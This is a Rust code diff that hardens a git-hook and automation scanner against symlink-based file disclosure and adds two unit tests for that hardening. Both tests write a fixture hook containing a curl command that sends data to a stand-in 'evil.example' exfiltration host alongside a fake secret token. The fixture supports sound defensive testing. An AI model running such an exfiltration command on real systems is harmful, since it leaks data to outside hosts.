@@ -542,11 +542,16 @@ fn collect_git_hooks(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
         if name.ends_with(".sample") {
             continue;
         }
-        if !path.is_file() {
+        // Skip real subdirectories WITHOUT following symlinks (`entry.file_type()`
+        // does not traverse). A symlink entry is deliberately NOT skipped here: it
+        // flows to `read_text`, which rejects it (O_NOFOLLOW) and surfaces it as an
+        // Info "unreadable" finding rather than disclosing the link target.
+        if entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
             continue;
         }
         push_hook_file(
             out,
+            repo_root,
             name.to_string(),
             HookProvider::Git,
             path.clone(),
@@ -570,11 +575,14 @@ fn collect_husky(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
         if name.starts_with('_') || name.starts_with('.') {
             continue; // .husky/_/, .gitignore, etc.
         }
-        if !path.is_file() {
+        // Skip real subdirectories WITHOUT following symlinks; a symlink entry
+        // flows to `read_text` and is rejected there (see `collect_git_hooks`).
+        if entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
             continue;
         }
         push_hook_file(
             out,
+            repo_root,
             name.to_string(),
             HookProvider::Husky,
             path.clone(),
@@ -588,12 +596,13 @@ fn collect_husky(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
 /// miss — it surfaces as an Info "present but unreadable" finding.
 fn push_hook_file(
     out: &mut Vec<RepoHookEntry>,
+    repo_root: &Path,
     name: String,
     provider: HookProvider,
     path: PathBuf,
     git_events: Vec<String>,
 ) {
-    match read_text(&path) {
+    match read_text(&path, repo_root) {
         Some(body) => push_entry(out, name, provider, path, body, git_events),
         None => {
             let location = path.display().to_string();
@@ -625,7 +634,7 @@ fn push_hook_file(
 fn collect_lefthook(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     for rel in ["lefthook.yml", "lefthook.yaml"] {
         let path = repo_root.join(rel);
-        let Some(contents) = read_text(&path) else {
+        let Some(contents) = read_text(&path, repo_root) else {
             continue;
         };
         for (event, body) in lefthook_events(&contents) {
@@ -683,7 +692,7 @@ fn lefthook_events(contents: &str) -> Vec<(String, String)> {
 fn collect_pre_commit(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     for rel in [".pre-commit-config.yaml", ".pre-commit-config.yml"] {
         let path = repo_root.join(rel);
-        let Some(contents) = read_text(&path) else {
+        let Some(contents) = read_text(&path, repo_root) else {
             continue;
         };
         push_entry(
@@ -702,7 +711,7 @@ fn collect_pre_commit(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
 /// entry (no git event). Parsed with `serde_json`; a malformed manifest is skipped.
 fn collect_package_json(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let path = repo_root.join("package.json");
-    let Some(contents) = read_text(&path) else {
+    let Some(contents) = read_text(&path, repo_root) else {
         return;
     };
     let Ok(value) = serde_json::from_str::<serde_json::Value>(&contents) else {
@@ -729,7 +738,7 @@ fn collect_package_json(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
 /// `.envrc` (direnv) — auto-sourced on `cd` after `direnv allow`. Whole file is the body.
 fn collect_direnv(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
     let path = repo_root.join(".envrc");
-    let Some(contents) = read_text(&path) else {
+    let Some(contents) = read_text(&path, repo_root) else {
         return;
     };
     push_entry(
@@ -777,7 +786,7 @@ fn collect_named_surfaces(
     let mut seen: Vec<PathBuf> = Vec::new();
     for (rel, provider) in surfaces {
         let path = repo_root.join(rel);
-        let Some(contents) = read_text(&path) else {
+        let Some(contents) = read_text(&path, repo_root) else {
             continue;
         };
         // Canonicalize for the dedup key; fall back to the literal path.
@@ -1094,12 +1103,35 @@ const GIT_EVENTS: &[&str] = &[
     "pre-applypatch",
 ];
 
-/// Read a regular file as UTF-8 text. `None` for dirs, missing files, perms, or non-UTF-8.
-fn read_text(path: &Path) -> Option<String> {
-    if !path.is_file() {
+/// Largest hook / automation body we read. A hook script or task-runner file is
+/// human-authored — 256 KiB is far past any real one, while bounding a hostile or
+/// symlinked-to-huge surface so a later verbatim `explain` emit can't be abused as
+/// an arbitrary-size disclosure channel.
+const MAX_HOOK_BODY_SIZE: u64 = 256 * 1024;
+
+/// Read a hook / automation body as UTF-8 text, REFUSING to follow a symlink and
+/// REFUSING to read outside `repo_root`. `None` (treated as "unreadable", never a
+/// panic) for dirs, missing files, perms, non-regular files, a symlinked final
+/// component, an oversized body, or any path that resolves outside `repo_root`
+/// (an intermediate-dir symlink redirecting `.git`/`.husky` elsewhere).
+///
+/// The body is emitted verbatim by `tirith hooks explain` (credential-redacted
+/// only), so a followed symlink here would disclose an arbitrary file's contents —
+/// hence `O_NOFOLLOW` (final component) + [`crate::util::canonical_within`]
+/// (intermediate dirs) + a size cap. A non-UTF-8 body yields `None` (handled
+/// gracefully, never a panic), preserving the prior `read_to_string().ok()`
+/// "non-UTF-8 → unreadable" contract for callers like [`push_hook_file`] that
+/// surface unreadable as an Info finding.
+fn read_text(path: &Path, repo_root: &Path) -> Option<String> {
+    // Reject an intermediate-directory symlink that redirects the read outside the
+    // repo (O_NOFOLLOW below only guards the final component).
+    if !crate::util::canonical_within(path, repo_root) {
         return None;
     }
-    std::fs::read_to_string(path).ok()
+    let bytes = crate::util::read_text_no_follow_capped(path, MAX_HOOK_BODY_SIZE).ok()?;
+    // A non-UTF-8 body is "unreadable" (the prior `read_to_string().ok()` contract);
+    // surfaces as the Info "present but unreadable" finding for hook files.
+    String::from_utf8(bytes).ok()
 }
 
 /// Build a name→entries map for callers that want grouped lookups.
@@ -1704,5 +1736,99 @@ mod tests {
         let scan = scan_for_repo(root.path());
         // No network/cred/sudo → no findings; the point is no panic on multibyte.
         assert!(scan.all_findings().is_empty());
+    }
+
+    /// PR128: a hook file that is a SYMLINK to a sentinel must NOT have the
+    /// sentinel's body read through (`O_NOFOLLOW`) — its body stays empty and it
+    /// surfaces as the Info "unreadable" finding, so `explain` cannot disclose the
+    /// link target's contents verbatim.
+    #[cfg(unix)]
+    #[test]
+    fn symlinked_hook_file_is_not_disclosed() {
+        let root = tempdir().unwrap();
+        mkgit(root.path());
+        // A sentinel OUTSIDE .git/hooks holding a secret + a rule-tripping `curl`.
+        let sentinel = root.path().join("secret.txt");
+        std::fs::write(
+            &sentinel,
+            "#!/bin/sh\ncurl https://evil.example/exfil # SECRET_TOKEN_abc123\n",
+        )
+        .unwrap();
+        // .git/hooks/pre-commit -> ../../secret.txt (symlinked final component).
+        let hook = root.path().join(".git/hooks/pre-commit");
+        std::os::unix::fs::symlink(&sentinel, &hook).unwrap();
+
+        let scan = scan_for_repo(root.path());
+        let pre = scan
+            .entries
+            .iter()
+            .find(|e| e.name == "pre-commit")
+            .expect("a symlinked hook must still be inventoried as unreadable");
+        // The sentinel body must NOT have been captured...
+        assert!(
+            pre.body.is_empty(),
+            "symlinked hook body must not be disclosed, got {:?}",
+            pre.body
+        );
+        assert!(
+            !pre.body.contains("SECRET_TOKEN_abc123"),
+            "the secret must never reach the entry body"
+        );
+        // ...and no body-derived rule (e.g. the curl network-call) may fire; only
+        // the Info "unreadable" finding is expected.
+        assert!(
+            !pre.findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
+            "a body rule must not fire on a symlink-rejected hook: {:?}",
+            pre.findings
+        );
+        assert!(
+            pre.findings
+                .iter()
+                .any(|f| f.severity == Severity::Info && f.detail.contains("unreadable")),
+            "a symlinked hook must surface the Info unreadable finding, got {:?}",
+            pre.findings
+        );
+    }
+
+    /// PR128: an INTERMEDIATE symlinked hooks directory (`.git` itself a symlink
+    /// pointing outside the repo) must be rejected by `canonical_within`, so a hook
+    /// whose real location is outside `repo_root` is never read.
+    #[cfg(unix)]
+    #[test]
+    fn intermediate_symlinked_git_dir_is_contained() {
+        // The repo we scan.
+        let repo = tempdir().unwrap();
+        // An attacker-controlled tree OUTSIDE the repo, holding a real hooks dir.
+        let outside = tempdir().unwrap();
+        std::fs::create_dir_all(outside.path().join("hooks")).unwrap();
+        std::fs::write(
+            outside.path().join("hooks/pre-commit"),
+            "#!/bin/sh\ncurl https://evil.example/exfil # SECRET_TOKEN_xyz789\n",
+        )
+        .unwrap();
+
+        // repo/.git -> <outside> : the WHOLE .git dir is a symlink out of the repo,
+        // so repo/.git/hooks/pre-commit resolves outside `repo_root`.
+        std::os::unix::fs::symlink(outside.path(), repo.path().join(".git")).unwrap();
+
+        let scan = scan_for_repo(repo.path());
+        // The body must never be read (containment fails), so the curl rule must
+        // not fire and the secret must not appear anywhere in the scan.
+        assert!(
+            !scan
+                .all_findings()
+                .iter()
+                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
+            "an out-of-repo hook (via symlinked .git) must not be classified: {:?}",
+            rule_ids(&scan)
+        );
+        assert!(
+            scan.entries
+                .iter()
+                .all(|e| !e.body.contains("SECRET_TOKEN_xyz789")),
+            "a hook outside repo_root must never have its body disclosed"
+        );
     }
 }
